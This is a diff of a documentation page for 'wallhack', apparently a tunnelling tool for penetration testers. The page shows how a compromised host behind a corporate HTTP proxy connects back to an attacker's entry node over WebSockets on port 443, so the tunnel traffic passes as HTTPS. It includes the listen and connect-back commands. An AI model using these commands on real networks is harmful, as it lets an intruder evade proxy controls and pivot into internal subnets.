@@ -1,30 +1,30 @@
 ---
 title: HTTP Proxy Example
-description: Tunnel through an HTTP or SOCKS5 proxy using the WebSockets transport.
+description: Tunnel through an HTTP or SOCKS5 proxy using TCP with WebSockets.
 order: 9
 ---
 
 # HTTP Proxy Example
 
-In this example, the compromised host (`10.0.1.5`) sits behind a corporate HTTP proxy that intercepts all outbound connections. The exit node uses WebSockets on TCP/443 so the tunnel traffic appears as HTTPS, and the proxy is configured via the standard `HTTPS_PROXY` environment variable.
+In this example, a compromised host (`10.0.1.5`) sits behind a corporate HTTP proxy that intercepts all outbound connections. WebSockets on TCP/443 are used so tunnel traffic appears as HTTPS, and the proxy is configured via the standard `HTTPS_PROXY` environment variable.
 
-The entry node (`192.168.1.5`) listens on TCP/443. Port 443 is used here because the proxy expects HTTPS traffic and the WebSocket upgrade handshake is indistinguishable from a standard HTTPS connection.
+An entry node (`192.168.1.5`) listens on TCP/443. Port 443 is used here because the proxy expects HTTPS traffic and the WebSocket upgrade handshake is indistinguishable from a standard HTTPS connection.
 
 {% trafficflow flow="192.168.1.5 (entry) -> proxy.corp.internal:8080 -> 10.0.1.5 (exit) -> 10.10.0.0/24" label="Traffic Flow:" /%}
 
 {% steps %}
 {% step title="Attacker (192.168.1.5)" number=1 %}
-An [entry node](/concepts) listening for WebSocket connections on TCP/443.
+Listening for WebSocket connections on TCP/443. Negotiates the [entry role](/concepts).
 
-{% codeblock code="wallhack entry --listen :443/tcp" /%}
+{% codeblock code="wallhack --listen :443/tcp" /%}
 {% /step %}
 
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
-An [exit node](/concepts) connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting. `--name` assigns a name to this peer — you'll reference it when adding routes from the entry node REPL.
+Connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting. Negotiates the [exit role](/concepts).
 
 ```bash
 export HTTPS_PROXY=http://proxy.corp.internal:8080
-wallhack exit --connect 192.168.1.5:443/tcp --name peer1
+wallhack --connect 192.168.1.5:443/tcp --name peer1
 ```
 
 If `--name` is omitted, a random name is generated — run `peers` in the REPL to discover it.
